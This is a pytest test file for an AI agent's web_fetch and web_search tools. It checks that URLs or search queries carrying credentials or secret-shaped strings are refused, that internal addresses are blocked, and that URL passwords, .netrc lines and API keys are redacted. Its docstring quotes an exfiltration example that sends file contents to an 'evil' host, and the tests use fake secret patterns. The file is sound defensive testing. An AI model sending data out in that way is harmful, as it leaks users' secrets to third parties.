"""web_fetch and web_search send nothing secret, and nowhere internal.

Security review 2026-09-16: outside a locked session web_fetch ran without
any check of what the URL carried -- web_fetch("https://evil/?d=<file>")
went straight out -- and a search query reached up to five third parties
unchecked. 100.64.0.0/10 (carrier-grade NAT, cluster internals) was not
treated as private. Passwords in URLs, .netrc lines and LiteLLM-style
sk- keys were not redacted anywhere.
"""
import urllib.parse

import pytest

from delfin.agent import output_guard as OG
from delfin.agent import web_tools as W


@pytest.fixture(autouse=True)
def _no_network(monkeypatch):
    def boom(*a, **k):
        raise AssertionError("a refused request must not reach the network")
    monkeypatch.setattr(W, "_fetch_bytes", boom)


def test_a_url_carrying_a_held_credential_is_refused(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: ["abcdEFGH1234ijkl5678"])
    out = W.web_fetch("https://example.org/collect?d=" + urllib.parse.quote("x abcdEFGH1234ijkl5678 y"))
    assert "refused to send this URL" in out["error"]
    assert "credential DELFIN holds" in out["error"]


def test_a_url_carrying_a_key_shape_is_refused(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    out = W.web_fetch("https://example.org/?k=sk-ant-" + "a" * 30)
    assert "shaped like a secret" in out["error"]


def test_a_query_too_long_to_be_a_lookup_is_refused(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    out = W.web_fetch("https://example.org/?d=" + "Q" * 2500)
    assert "too long to be a lookup" in out["error"]


def test_a_search_query_with_a_secret_is_sent_nowhere(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    monkeypatch.setattr(W, "_keyed_search", lambda *a, **k: (_ for _ in ()).throw(AssertionError("sent")))
    out = W.web_search("what is OPENAI_API_KEY=sk-proj-" + "B" * 30)
    assert "refused to send this search query" in out["error"]


def test_an_ordinary_query_is_not_refused(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    assert W.outbound_secret_reason("ORCA 6.0 release date Neese") is None
    assert W.outbound_secret_reason("https://doi.org/10.1002/wcms.70019") is None


def test_carrier_grade_nat_is_internal(monkeypatch):
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    monkeypatch.setattr(W.socket, "getaddrinfo", lambda host, port: [(2, 1, 6, "", ("100.72.3.4", 0))])
    assert "private/loopback" in W._check_url("https://cluster-thing.example/")


@pytest.mark.parametrize("text,kind", [
    ("clone https://max:S3cretPassw0rd@git.example.org/repo.git", "url-password"),
    ("machine api.example.org login max password hunter2xyz", "netrc-password"),
    ("litellm key sk-AbCdEfGhIjKlMnOpQrStUv in the traceback", "provider-api-key"),
])
def test_new_secret_shapes_are_redacted(text, kind):
    findings = []
    out = OG._redact_secrets(text, findings)
    assert any(f["detail"] == kind for f in findings), (out, findings)
